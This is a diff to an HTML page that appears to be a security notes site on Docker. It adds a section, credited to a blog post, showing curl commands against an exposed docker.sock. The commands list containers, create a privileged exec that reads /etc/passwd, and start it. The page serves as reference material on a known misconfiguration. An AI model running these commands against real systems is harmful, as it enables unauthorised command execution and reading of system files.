@@ -323,6 +323,8 @@
 
     
 
+    
+
     </ul>
                 </li>
                 <li class="">
@@ -446,6 +448,47 @@ with a binding to files own by root and read them:</p>
 <h2 id="save-image-to-tar-file">Save image to tar file</h2>
 <div class="clipboard-content">  <pre><code class="language-bash">docker save -o output.tar public.ecr.aws/xxx/yyy
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="docker save -o output.tar public.ecr.aws/xxx/yyy
+">    Copy  </button></div></div>
+<h2 id="exploit-dockersock-with-curl">Exploit docker.sock with curl</h2>
+<p>From <a href="https://dejandayoff.com/the-danger-of-exposing-docker.sock/" target="_blank">https://dejandayoff.com/the-danger-of-exposing-docker.sock/</a>:</p>
+<div class="clipboard-content">  <pre><code class="language-bash">root@1nmyd0ck3r:~# ls -al /var/run/docker.sock
+srw-rw---- 1 root 998 0 May 29 15:07 /var/run/docker.sock
+
+root@1nmyd0ck3r:~# curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
+[
+    {
+        &quot;Id&quot;: &quot;9a79cbdfbc4d48982f1a427909bb6...&quot;,
+        # ...
+    },
+    {
+        &quot;Id&quot;: &quot;76b79677e3cc5db8764df08d75474...&quot;,
+        # ...
+    }
+]
+
+root@1nmyd0ck3r:~# curl -X POST -H &quot;Content-Type: application/json&quot; --data-binary '{&quot;AttachStdin&quot;: true,&quot;AttachStdout&quot;: true,&quot;AttachStderr&quot;: true,&quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],&quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,&quot;Privileged&quot;: true,&quot;Tty&quot;: true}' --unix-socket /var/run/docker.sock http://127.0.0.1/containers/9a79cbdfbc4d48982f1a427909bb6.../exec
+{&quot;Id&quot;:&quot;1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256&quot;}
+
+root@1nmyd0ck3r:~# curl --output - -X POST -H 'Content-Type: application/json' --data-binary '{&quot;Detach&quot;: false,&quot;Tty&quot;: false}' --unix-socket /var/run/docker.sock http://127.0.0.1/exec/1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256/start
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="root@1nmyd0ck3r:~# ls -al /var/run/docker.sock
+srw-rw---- 1 root 998 0 May 29 15:07 /var/run/docker.sock
+
+root@1nmyd0ck3r:~# curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
+[
+    {
+        &quot;Id&quot;: &quot;9a79cbdfbc4d48982f1a427909bb6...&quot;,
+        # ...
+    },
+    {
+        &quot;Id&quot;: &quot;76b79677e3cc5db8764df08d75474...&quot;,
+        # ...
+    }
+]
+
+root@1nmyd0ck3r:~# curl -X POST -H &quot;Content-Type: application/json&quot; --data-binary '{&quot;AttachStdin&quot;: true,&quot;AttachStdout&quot;: true,&quot;AttachStderr&quot;: true,&quot;Cmd&quot;: [&quot;cat&quot;, &quot;/etc/passwd&quot;],&quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,&quot;Privileged&quot;: true,&quot;Tty&quot;: true}' --unix-socket /var/run/docker.sock http://127.0.0.1/containers/9a79cbdfbc4d48982f1a427909bb6.../exec
+{&quot;Id&quot;:&quot;1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256&quot;}
+
+root@1nmyd0ck3r:~# curl --output - -X POST -H 'Content-Type: application/json' --data-binary '{&quot;Detach&quot;: false,&quot;Tty&quot;: false}' --unix-socket /var/run/docker.sock http://127.0.0.1/exec/1bb5e42858b7f684152a66e8ac54ced5c80aa0c50d1eb5a482341076d61ee256/start
 ">    Copy  </button></div></div>
             
           </div>
